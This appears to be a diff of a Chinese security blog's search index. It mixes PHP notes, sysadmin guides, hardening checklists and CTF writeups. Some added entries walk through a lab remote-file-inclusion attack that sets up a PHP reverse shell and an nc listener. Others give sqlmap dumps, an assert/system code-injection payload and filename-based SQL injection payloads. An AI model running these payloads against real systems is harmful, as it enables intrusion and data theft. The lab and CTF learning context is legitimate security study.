-    <content type="text"><![CDATA[1.PHP var_dump() 函数返回变量的数据类型和值：&lt;?php $x = 5985; var_dump($x); //运行结果int(5985) 2.设置 PHP 常量设置常量，使用 define() 函数，函数语法如下： bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) &lt;?php // 区分大小写的常量名 define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;); &lt;br&gt; echo GREETING; // 输出 &quot;欢迎访问 Runoob.com&quot; &lt;br&gt; echo &#39;&lt;\br&gt;&#39;; &lt;br&gt; echo greeting; // 输出 &quot;greeting&quot; ?&gt; 常量在定义 后，默认是全局变量，可以在整个运行的脚本的任何地方使用。 3.字符串函数 并置运算符 (.) 用于把两个字符串值连接起来。 下面的实例演示了如何将两个字符串变量连接在一起： 实例 &lt;?php $txt1=&quot;Hello world!&quot;; &lt;br&gt; $txt2=&quot;What a nice day!&quot;; &lt;br&gt; echo $txt1 . &quot; &quot; . $txt2; &lt;br&gt; ?&gt; //运行结果：Hello world! What a nice day! PHP strlen() 函数有时知道字符串值的长度是很有用的。strlen() 函数返回字符串的长度（字符数）。&lt;?php echo strlen(&quot;Hello world!&quot;); ?&gt; 运行结果：12 PHP strpos() 函数 strpos() 函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。 &lt;?php echo strpos(&quot;Hello world!&quot;,&quot;world&quot;); ?&gt; 输出：6 PHP strpos() 查找字符串首次出现的位置 PHP strrpos() 获取指定字符串在目标字符串中最后一次出现的位置 $url=&#39;C:\web\apache2\htdoc\cat.jpg&#39;; $pos=strrpos($url, &#39;\\&#39;); //截取文件输出名称：cat.jpg echo substr($url, $pos+1); //截取文件所在路径，输出结果：C:\web\apache2\htdoc\ str_replace() 用于对字符串中的某些字符的替换 $tel = &#39;1881088188&#39;; $len=4; $replace =str_repeat(&#39;*&#39;,$len); echo stubstr_replace($tel, $replace, 3, $len); //输出结果：188****1888 substr() 用于获取字符串的子串 explode() 使用一个字符串分割另一个字符串 implode() 用于指定的连接符键数组拼接成一个字符串 trim（） 去除字符串首尾处的空白字符 $str = &#39; These are a few word :).... &#39;; echo &#39;原字符串:&#39; .$str. &#39;&lt;br&gt;&#39;; echo &#39;去空白后的字符串:&#39;.trim($str); str_repeat() 重复一个字符串 strcmp() 用于判断两个字符串的大小 if (strcmp(&#39;ye_PHP&#39;, &#39;yePHP&#39;)) echo &#39;not the same } else { echo &#39;the same string&#39;; } 4.数组 数组创建在 PHP 中，array() 函数用于创建数组：array();PHP 数值数组这里有两种创建数值数组的方法： 自动分配 ID 键（ID 键总是从 0 开始）： $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); 人工分配 ID 键： $cars[0]=&quot;Volvo&quot;; $cars[1]=&quot;BMW&quot;; $cars[2]=&quot;Toyota&quot; ; &lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;; \\输出结果：I like Volvo, BMW and Toyota. count() 函数用于返回数组的长度（元素的数量）： &lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); echo count($cars); ?&gt; 关联数组是使用您分配给数组的指定的键的数组。这里有两种创建关联数组的方法：$age=array(“Peter”=&gt;”35”,”Ben”=&gt;”37”,”Joe”=&gt;”43”); &lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); echo &quot;Peter is &quot; . $age[&#39;Peter&#39;] . &quot; years old.&quot;; ?&gt; foreach()遍历数组$info=[&#39;id&#39;=&gt;1,&#39;usr&#39;=&gt;&#39;Jacie&#39;,&#39;age&#39;=&gt;18]； //使用方法一 foreach ($info as $k=&gt;$v){ //$k=键名，$v=键值 echo $k . &#39;:&#39; .$v. &#39; &#39;; //输出结果：id= 1 usr: Jacie age: 18 } //使用方法二 foreach($info as $v){ echo $v .&#39;&#39;; //输出结果：1 Jacie 18 } 5.类 类的定义class 类名 { //成员属性 //成员方法 } 类名后的“{}”中是==类的成员==，在类中声明得==变量是成员属性==，在类中声明得==函数是成员方法== 实例化类 $对象名 = new 类名([参数1，参数2，...]); 对象-&gt;成员 “-&gt;”对象成员访问符 &lt;?php class Person //创建类 { public $name = &#39;Tom&#39;; //成员属性 public $age ; } $p = new Person (); echo $p-&gt;name; //获取默认属性值，输出结果：Tom $p-&gt;name = &#39;Lucy&#39; //修改默认属性值 echo $p-&gt;name; //输出结果：Lucy $p-&gt;age=15; //为属性赋值 echo $p-&gt;age; //输出:15 unset ($p-&gt;age); //删除属性值 var_dump(isset($p-&gt;age)); //检测属性是否设置，输出：bool(false) var_dump($property_exists(&#39;Person&#39;,&#39;age&#39;))； //检验属性是否定义，输出：bool(true) 6.mysql连接\\连接数据库 $link = mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;12344&#39;,&#39;sqlname&#39;,&#39;3306&#39;) \\查看数据库连接是否正确 echo $link ? &#39;连接数据库成功&#39; ：&#39;连接数据库失败&#39; 设置字符集 \\ 数据库连接 $link = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;); \\ 设置字符集 mysql_set_charset($link,&#39;utf8&#39;); mysql_query($link,&#39;USE &#39;istheima&#39;); \\mysql_qurey函数包含sql语句 result = mysqli_query($link,&#39;SHOW TABLES&#39;); if ($result){ exit(&#39;错误信息：&#39;.mysqli_error($link)); } 7.web表单交互 post方式&lt;form mothod=&quot;post&quot;&gt; 用户名:&lt;input type = &#39;text&#39; name=&#39;username&#39;&gt; 密码:&lt;input type = &quot;password&quot; name=&quot;password&quot;&gt; &lt;input type=&quot;submit&quot; vlue=&quot;登录&quot;&gt; &lt;/form&gt; 接收表单的密码和数据if (isset($_POST[&#39;username&#39;])) &amp;&amp; isset($_POST[&#39;password&#39;]){ $username = $_POST[&#39;username&#39;]; $password = $_POST[&#39;password&#39;]; } get方式把上面html代码改成get，提交表单时得到一串url，如下：http://localhost/login.php?username=test$password=123456上述url中，”?”为参数信息，参数为参数名和参数值组成，”&amp;”为分隔符输出表单的密码和数据if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset （&#39;$_GET[password]&#39;）){ echo $_GET[&#39;username&#39;]; echo $_GET[&#39;password&#39;]; } 8.cookie与session创键 cookie得创建bool setcookie( string $name, //cookie的名（必选） string $value = &quot;&quot;; //cookie的值（可选） int $expire = 0, //cookie的有效期（可选） string $path = &quot;&quot;, //cookie在服务器的路径（可选） string $domin = &quot;&quot;, //cookie的有效域名（可选） bool $secure = false, //指定是否通过安全的https连接来传输（可选） \\设置cookie setcookie(&#39;aaa&#39;,&#39;123&#39;); setcookie(&#39;bbb&#39;,&#39;456&#39;); \\设置cookie过期时间 setcookie(&#39;data&#39;,&#39;php&#39;); //未指定过期时间，在会话结束时过期 setcookie(&#39;data&#39;,&#39;php&#39;,time()+1800); //30分钟过期 setcookie(&#39;data&#39;,&#39;php&#39;,time()+60*60*24); //一天后过期 \\删除cookie setcookie(&#39;data&#39;,&#39;&#39;,time()-1); //立即过期相当于过期 session的基本使用`&lt;?phpsession_start(); //开启session的函数$_SESSION[‘username’] = ‘tom’; //向session添加字符串$_SESSIOMN[‘id’]=[‘1’,’2’,’3’]; //向session添加数组if(isset($_SESSION[‘test’])){ $test = $_SESSION[‘test’] //判断session是否有存在test并将其读取}unset($_SESSION[‘username’]); //删除单个session$_SESSION = []; //删除所有数据session_destroy(); //结束所有对话 &lt;?phpecho strlen(“Hello world!”);?&gt; 运行结果：12`]]></content>
-      <categories>
-        <category>code</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[windows server 2012 dns服务器搭建]]></title>
-    <url>%2F2019%2F12%2F24%2Fwindows%20server2012%20dns%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
-    <content type="text"><![CDATA[1.安装dns服务器打开服务器管理器，仪表板———&gt;添加角色和功能，下一步下一步，到了服务器角色打勾选择DNS服务器，然后等待安装完成，在所有应用中可以看到多了一个dns，点击打开 2.创建正向主要区域正向查找区域用于通过域名查询ip地址右键正向查找区域——&gt;新建区域——&gt;下一步，区域类型选择主要区域区域名称是域名的意思，这里我test.com示范区域文件，没有需求默认就好不允许动态更新 3.创建反向主要区域反向查找区域用于通过ip地址查询dns名称右键反向查找区域——&gt;新建区域——&gt;下一步，区域类型选择主要区域，下一步ipv4方向查找区域输入dns服务器的网络id默认文件，并且不动态更新 4.创建资源记录&amp;测试配置测试环境在客户端配置网卡dns服务器指向 创建正向查找资源记录&amp;测试1.建立test.com的域名解析右建test.com——&gt;新建主机，名称为空，ip为测试的ip，这里我用dns服务器的ip为测试,添加主机 2.建立www.test.com解析操作同1 3.建立11.test.com解析到www.test.com右建test.com——&gt;新建别名，别名为11，完全限定的域名为默认，目标主机的完全合格的域名填www.test.com添加主机 4.测试正向解析域名 创建反向查找资源记录&amp;测试1.创建反向查找资源记录右键反向区域名称——&gt;新建指针主机IP地址我这里选择dns服务器ip测试，限定域名为默认，主机名为www.test1.com在建一个主机名为test的，操作同上 2.测试反向查找测试成功]]></content>
-      <categories>
-        <category>windows</category>
-      </categories>
-      <tags>
-        <tag>windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[攻防世界misc新手区 Wiretup]]></title>
-    <url>%2F2019%2F12%2F24%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp%2F</url>
-    <content type="text"><![CDATA[1.this_is_flag标线即为flag值 2.ext3下载文件后放进linux，flie命令查看是什么文件，可以看到是磁盘文件，将其挂载 可以查看flag文本文件，cat查看得base64的编码，进行转换得flag值 3.give_you_flag下载后是一张gif有一副二维码的图片，用Stegsolve保存二维码的图片 用ps软件修复二维码图片，二维码扫出来即为flag值 4.pdf下载后是一个pdf文件，将pdf转换word文件，我这里用wps自带转换 打开转换的word，删除图片或移动缩小图片，即可看见图片下藏着flag值 5.stegano将pdf用浏览器打开选择全选，复制到记事本里去，可以发现AABB的一段文字，是摩斯电码，A是点，B是划等到-.-. — -. –. .-. .- - ..- .-.. .- - .. — -. … –..– ..-. .-.. .- –. —… .—- -. …- .—- ….. .—- -… .-.. …– – …– ….. ….. ….- –. …–转化成字母即为flag flag格式是flag{1nv151bl3m3554g3} 6.SimpleRAR下载后是一个压缩包，用winhex查看一下，可以secret.png文件，把A8 3C 7A修改为A8 3C 74,这个是RAR对png文件头的编码.解压可以看到一张png图片，显示空白 再用winhex打开png图片，可以看到GIF文件头，GIF (gif)，文件头：47494638，把png文件格式改为gif 把gif发到stesolve跑一下，只弄出来一半。 再把gif丢进ps里，是两个图层的，导出另一图层的一张，再丢进stegsolve跑下，跑出二维码破碎的上部分 再报这两张图片丢进ps，ps修复一下，flag{yanji4n_bu_we1shi} 7.坚持60s用jd-gui 打开下载的java程序，搜索关键字flag，得到是base64编码进行转化 8.gif下载是个压缩包，进行解压时一堆黑白的图片，可以联想二进制，白是0，黑是1二进制转换成字符串，得flag值 9.掀桌子 每两个一组，将16进制转换为10进制，减去128以后输出 ascii 10.如来十三掌打开是与佛论禅，到http://keyfc.net/bbs/tools/tudoucode.aspx解密，佛了。 解 rot-13 ，得到ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9在base64解码flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab} 11.base64stego下载来一个解压包，需要密码，伪加密来着，用winrar修复功能修复一下就可以打开了，打开一大串base64，应该是吧，直接解解不出来 参考https://www.tr0y.wang/2017/06/14/Base64steg/使用脚本处理一下 12.功夫再高也怕菜刀下载下来是个流量包，binwalk跑一下，里面还包含一个zip，foremost分离文件 ，zip包需要密码，不是弱密码 分析流量包，搜索flag.txt关键字，在1150行，追踪tcp流量流，发现jpg十六进制加密，还原jpg图片，图片文字即压缩包密码， flag值为：]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[linux开启配置telnet]]></title>
-    <url>%2F2019%2F07%2F24%2Flinux%E5%BC%80%E5%90%AF%E9%85%8D%E7%BD%AEtelnet%2F</url>
-    <content type="text"><![CDATA[1.安装telnet的必要软件yum install telnet telnet-server xinetd -y下载telnet、telnet、xinetd三个软件.2.修改xinetd配置文件vim /etc/xinetd.d/telnet把disable = no 从yes改为no3.配置允许root登录方法一：vim /etc/pam.d/login把修改 account required pam_nologin.so注释掉方法二：mv /etc/securetty /etc/securetty.bak移除securetty文件 验证规则设置在/etc/security文件中，该文件定义root用户只能在tty1-tty6的终端上记录，删除该文件或者将其改名即可避开验证规则实现root用户远程登录。4.重启服务本地测试service xinetd restart重新启动xinetd服务在本机telnet自己，telnet 127.0.0.1 root用户登录成功 iptables -F关闭防火墙远程成功登录]]></content>
-      <categories>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[linux opendssh 升级]]></title>
-    <url>%2F2019%2F07%2F24%2Flinux%20opendssh%20%E5%8D%87%E7%BA%A7%2F</url>
-    <content type="text"><![CDATA[1.在工作中遇到openshh升级问题，因为客户那边是内网很难搞，要升级openshh要装依赖，客户那边又不能联网，所以我在自己笔记本本地搭建了一个yum服务器，供客户那边linux下载软件包，然后openssh开启中途可能ssh服务不能用，解决这些问题后，我想到开启telnet服务，以防万一，万一Linux不能连接，客户不得拿刀砍我，， 1.开始工作查看系统版本、查看openssh版本，下载openssh最新包我这里是openshh8.0shh -V查看openssh版本，rpm -qa|grep openssh查看openssh相关包2.安装必要软件cp /etc/init.d/sshd /etc/init.d/sshd.bak备份下sshd文件yum -y install gcc pam pam-devel zlib zlib-devel openssl-devel3.安装openshh卸载旧的openssh rpm -e `rpm -qa | grep openssh` --nodeps解压openssh安装包tar -zxvf openssh-8.0p1.tar_2.gz./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-zlib --with-ssl-dir=/usr/local/ssl --with-privsep-path=/var/lib/sshd ```make install 安装完成如果遇到报错chmod 600 /etc/ssh/ssh_host_*输入这些命令`install -v -m755 contrib/ssh-copy-id /usr/bin install -v -m644 contrib/ssh-copy-id.1 /usr/share/man/man1 install -v -m755 -d /usr/share/doc/openssh-8.0p1 install -v -m644 INSTALL LICENCE OVERVIEW README* /usr/share/doc/openssh-8.0p1ssh -V测试一下现在的版本是多少了，openssh 8.0了]]></content>
-      <categories>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[搭建本地yum服务器]]></title>
-    <url>%2F2019%2F07%2F24%2F%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
-    <content type="text"><![CDATA[1.在linux安装apache我这里是拿kali虚拟机自带的apache做中间件。dpkg -L apache2查看apache相关的文件,在/var/www下web网页放置 2.虚拟机挂载cent光盘df -h 列出文件系统、找出光盘的文件系统，mount /dev/sr1 /mnt/cdrom挂载/dev/sr1到/mnt/cdrom 3.将光盘的安装包拷贝到web目录下mkdir /var/www/centos 创建目录 /var/www/centos mkdir /var/www/centos/x86_64创建目录/var/www/centos/x86_64mkdir /var/www/centos/extra创建目录/var/www/centos/extramkdir /var/www/centos/update创建目录/var/www/centos/updatecd /mnt/cdrom/ls进入挂载光盘的目录 查看光盘文件cp Packages/* /var/www/centos/x86_64/ 把 Packages/下的软件包复制到/var/www/centos/x86_64/目录下，apt-get install -y createrepo下载createrepo，目的是生成repodata目录createrepo -pdo /var/www/centos/x86_64 /var/www/centos/x86_64createrepo -pdo /var/www/centos/extra /var/www/centos/extracreaterepo -pdo /var/www/centos/update /var/www/centos/eupdate重启一下apache服务service apache2 restart测试访问web网页，ip为虚拟机的4.客户端配置访问yum源服务器vim /etc/yum.repos.d/CentOS-Base.repoyum clean all 清除所有缓存yum makecache 重新下载缓存可以发现已经可以了，现在测试一下，下载一个tree包试一下yum install tree -y可能cdrom里面的包不够多，我们同步一下163远程的包，用rsync协议rsync -avrt --delete rsync://mirrors.163.com/centos/6/updates/x86_ 64/Packages/ /var/www/centos/update]]></content>
-      <categories>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[修改远程桌面3389端口]]></title>
-    <url>%2F2019%2F07%2F02%2F%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3%2F</url>
-    <content type="text"><![CDATA[在修改前在防火墙添加修改远程端口的允许通过的策略，或者暂时关闭防火墙，不然修改完端口号远程连接不上。运行regedit找到注册表[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] PortNumber位置，点击十进制，修改远程连接的端口号，这里以4567为列。 找到注册表[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] 双击右边 PortNumber-点十进制-更改值为：4567 使其注册表生效，这里windows server2008/2012 为例，重启生效， 或者运行service.msc，找到remote desktop service服务管理重启生效 这里以windows server2008/2012 为例，像xp、server2003比较旧的系统是没有remote desktop service服务,需要重启才能生效]]></content>
-      <categories>
-        <category>windows</category>
-      </categories>
-      <tags>
-        <tag>windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[windows服务器主机加固]]></title>
-    <url>%2F2019%2F06%2F15%2Fwindows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA%2F</url>
-    <content type="text"><![CDATA[1.禁用Guest账户和无关账户Guest账户为黑客入侵打开了方便之门，黑客使用Guest账户可以进行提权。禁用Guest账户是最好的选择。操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;本地用户和组-&gt;用户-&gt;Guest”“账户已禁用”打勾启用加固后： 2.密码策略加强 操作系统、用户身份鉴别信息应具有不易被冒用的特点，口令应复杂度要求并定期更换。 操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;密码策略”; “密码必须符合复杂度要求” 设 置为“启用” “密码长度最小值”设置为“8个字符”“密码最长使用期限”设置为“90天”“强制密码历史”设置为“记住5个密码”“用可以还原的加密来存储密码”设置为“禁用” 加固前：加固后： 3.账户锁定策略加强对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过5 次（不含5 次），锁定该用户使用的账号。操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;帐户锁定策略”： “账户额锁定阀值”设置为 5 次“账户锁定时间”设置为 15分钟“复位账户锁定计数器”设置为 15分钟 加固前：加固后 4.设置安全审计在主机的审核策略上设置日志审核策略操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;审核策略”在主机的审核策略上设置日志审核策略： 审计帐户登录事件： 成功，失败 审计帐户管理： 成功，失败 审计目录服务访问： 成功，失败审计登录事件： 成功，失败 审计对象访问： 成功，失败 审计策略更改： 成功，失败 审计特权使用： 成功，失败 审计系统事件： 成功，失败审计过程追踪： 成功，失败 加固前:加固后: 5.设置不显示上次使用的用户名在本地安全设置系统登录时不显示上次使用的用户名。进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项”； “交互式登录：不显示上次的用户名”设置为“已启用” 加固前：加固后： 6启用主机安全选项的”关机前清除虚拟内存页面”启用主机安全选项的“关机前清除虚拟内存页面操作流程:进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项 关机：清除虚拟页面文件内存”设置为“已启用” 加固前：加固后： 7.配置日志文件大小 配置日志文件容量，避免受到未预期的删除、修改或覆盖等 操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;事件查看器-&gt;windows日志”，配置加固前： 加固后： 8.磁盘配额配置磁盘配额可以限制指定账户能够使用的磁盘空间,这样可以避免因某个用户的过度使用磁盘空间造成其他用户无法正常工作甚至影响系统运行操作流程：进入“我的电脑-&gt;C盘-&gt;属性-&gt;配额”， “启用磁盘管理”设置为启用“磁盘空间限制为”设置为”90GB”“将警告等级设为”设置为”90GB”“用户超出配额限制时记录事件（G）”打勾启用“用户超过警告等级时记录事件（V）” 打勾启用 加固前：加固后： 9.远程会话策略默认情况下，远程桌面服务允许用户从远程桌面服务会话开连接，而不用注销和结束会话。启用此策略设置，则达到指定时间后将从服务器中删除已断开连接的会话操作流程：进入“运行-&gt;gpedit.msc-&gt;计算机配置-&gt;管理模板-&gt;wondows组件-&gt;远程服务-&gt;远程桌面会话主机-&gt;会话时间限制”， “设置已中断会话的时间限制”设置为“已启用”“结束已断开连接的会话”设置为“5分钟” 加固前： 加固后:]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>安全加固</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Bugku-web题，ctf模拟题sql注入神奇的登陆框]]></title>
-    <url>%2F2019%2F05%2F17%2FBugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
-    <content type="text"><![CDATA[这是Bugku-web题，地址为http://123.206.87.240:9001/sql/登陆网站，打开burp进行截断，账号密码随便打，burp截取后进行保存。使用sqlmap自动注入，可以发现数据库版本，数据库名使用sqlmap自动注入，发现表名flag1使用sqlmap自动注入，查看表flag1中列flag1的值使用sqlmap自动注入，可以列flag1的值]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>web破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[linux系统安全配置]]></title>
-    <url>%2F2019%2F05%2F17%2Flinux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%2F</url>
-    <content type="text"><![CDATA[用户管理1.删除系统特殊的用户账号和组账号查看系统所有用户名cat /etc/passwd删除用户jaie命令userdel jaie 2.用户密码设置编辑login.defs文件vim /etc/login.defs 3.修改自动注销账户的时间编辑profilevim /etc/profile修改“HISTSIZE”参数的值，即注销等待时间 4.给系统用户名密码存放文件加锁，防止非授权用户获得权限用chattr命令防止系统中某个关键文件被修改:chattr +i /etc/passwd 系统管理配置1.关闭系统不必要的服务cd /etc/init.d/目录下，使用mv命令把init.d下改为*.old类的文件名，目的是让系统启动时找不到这个服务的文件 2.修改init.d目录执行权限，防止修改 3.给系统服务端口列表文件加锁防止未经许可的删除或添加服务 4.修改ssh服务端口vi /etc/ssh/ssh_config把port前的#去掉，并修改端口号，保存退出。重启shh服务 5.修改部分系统文件的SUID和SGID的权限权限为SUID和SGID的执行文件，在程序运行过程中，会给进程所有者权限，如果被黑客利用就会给系统造成危害。修改chage文件的权限 6.日志管理使用dmesg查看系统引导日志cd /var/log/在log中可以看到一些的日志文件，修改这些日志的权限可以防止不相干的人修改。 lastlog记录用户最后一次成功登录时间 loginlog不良的登录尝试记录 messages 记录输出系统主控台以及由syslog系统服务程序产生的消息 utmp记录当前当前登录得每个用户 utmp扩展得utmp wtmp 记录每一次用户登陆和注销的历史消息 wtmpx 扩展的wtmp vold.log记录使用外部介质出现的错误 xferkig记录ftp的存取情况 sulog记录su命令的使用情况 acct记录每个用户使用过的命令 aculog拔出移动呼叫记录 XFree86.0.log记录Xfree86 Xwindows服务器最后一次执行的结果文件数字带有.1,.2,.3…文件为轮询日志文件。数字越大，日志越老]]></content>
-      <categories>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[文件遍历漏洞]]></title>
-    <url>%2F2019%2F04%2F25%2F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
+    <url>%2F2020%2F07%2F11%2F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[环境搭建测试机ip：192.168.86.135靶机metasploittable的ip:192.168.86.128靶机编辑php.ini文件 sudo vim /etc/php5/cgi/php.ini //编辑php配置文件 找到allow_url_include这一行把Off改成On， sudo /etc/init.d/apache2 restart //重启apache服务 发起攻击 尝试文件/etc/passwd遍历查看，成功。 尝试定位url链接，成功 测试机开启apache服务，制作php反弹shell，使其定位其链接http://192.168.86.135/1.php`cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php //复制成1.php到web目录下vim 1.php //修改127.0.0.1成测试机ip完成保存service apache2 start //开启apache服务nc -nvvlp 1234 //nc开启监控端口 `]]></content>
       <categories>
         <category>渗透测试</category>
@@ -188,127 +75,31 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[mitmf使用实行中间人xss攻击]]></title>
-    <url>%2F2019%2F04%2F25%2Fmitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB%2F</url>
-    <content type="text"><![CDATA[下载mitmfapt-get install mitmfkali2.0以上默认没有mitmf软件，kali1.0有mitmif。blackarch集成mitmf，推荐使用。 mitmf实行xss攻击启动beefcd /usr/share.beef/目录下，./beef启动beef默认账号密码都为beef使用arp欺骗，插入js脚本，实现xss攻击可以看到网页源码已经插入js脚本了 mitmf键盘记录器mitmf网页图片倒置（恶作剧） mitmf cookie显示]]></content>
+    <title><![CDATA[攻防世界web 高手区部分Writeup]]></title>
+    <url>%2F2020%2F07%2F11%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%20%E9%83%A8%E5%88%86wp%2F</url>
+    <content type="text"><![CDATA[攻防世界web高手区1.ics-06url中id=1，进行爆破，到2333，出现flag Flag:cyberpeace{4468f3e51629f05830259d073f03dbd6} 2. NewsCenter ——sql注入sql注入post型，sqlmap自动化注入，sqlmap.py -r “post.txt” –dbs -D news -T secret_table –dump flag:QCTF{sq1_inJec7ion_ezzz} 3. Mfw ——.git路径信息泄漏进行目录扫描，发现。.git目录泄漏 GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。 flag.php源文件看不所以来，去index.php看一下进行代码审计 $file = “templates/“ . $page . “.php”;page这个变量是直接从GET参数中获取的，没有进行任何处理，那么也就意味着我们输入的任何东西就能够在不被验证的情况下执行。那么，我们可以在这个位置放置system函数。这样，由于后面的assert函数，system函数就成功得以运行并输出结果。 构建$file变量：$file = “templates/“ . ‘.system(“ pwd ;”).’ . “.php”; flag.php不存在，使用git diff比较工作区与暂存区的差异 4. NaNNaNNaNNaN-Batman下载下来的压缩包解压，得到一个web100的文本，查看是乱码，但还是可以看出是js代码，把文件类型改为html，在浏览器打开 把eval（）函数改成alert()函数，弹窗可以得到源代码了 js function $() { var e = document.getElementById(‘c’).value; if (e.length == 16) { if (e.match(/^be0f23/) != null) { if (e.match(/233ac/) != null) { if (e.match(/e98aa$/) != null) { if (e.match(/c7be9/) != null) { var t = [‘fl’, ‘s_a’, ‘i’, ‘e}’]; var n = [‘a’, ‘_h0l’, ‘n’]; var r = [‘g{‘, ‘e’, ‘0’]; var i = [‘it\’’, ‘‘, ‘n’]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) { document.write(s[o % 4][0]); s[o % 4].splice(0, 1); } } } } } } } document.write(‘Ok‘); delete _; 根据分析是正则表达式 be0f233ac7be98aa。 把它输入文本框，得到flag值， 5. Upload —————文件名注入用常规的文件上传方式失败无果，且无法得到上传文件放置的目录 文件名称注入,使用select,from,发现被过滤，内嵌select绕过过滤，使用CONV,substr,hex 函数，CONV函数将16进制转化为10进制，依次获取子串的12位，用substr截取12是因为一旦过长，会用科学计数法表示。 返回回显数字131277325825392转化为字符串为web_up即为部分库名， 文件名’+(selselectect CONV(substr(hex(dAtaBase()),13,12),16,10))+’.jpg让其显示库名的后部分 1819238756转化二进制转化字符串即为load，合并前一部分数据库名为web_upload 文件名 ‘+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),1,12),16,10))+’.jpg 转换为字符串为：hello_ 文件名’+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),13,12),16,10))+’.jpg 得到回显为：112615676665705转化字符串flag_i 继续探测表名， 文件名’+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),25,12),16,10))+’.jpg 得到回显：126853610566245转化字符串：s_here 最终得到表名为：hello_flag_is_here 得到表名继续探测列名构建sql注入语句 文件名’+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),1,12),16,10))+’.jpg 得到回显为：115858377367398转化为字符串i_am_f 文件名’+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),13,12),16,10))+’.jpg 得到回显为7102823转化字符串lag。 所以列名为i_am_flag 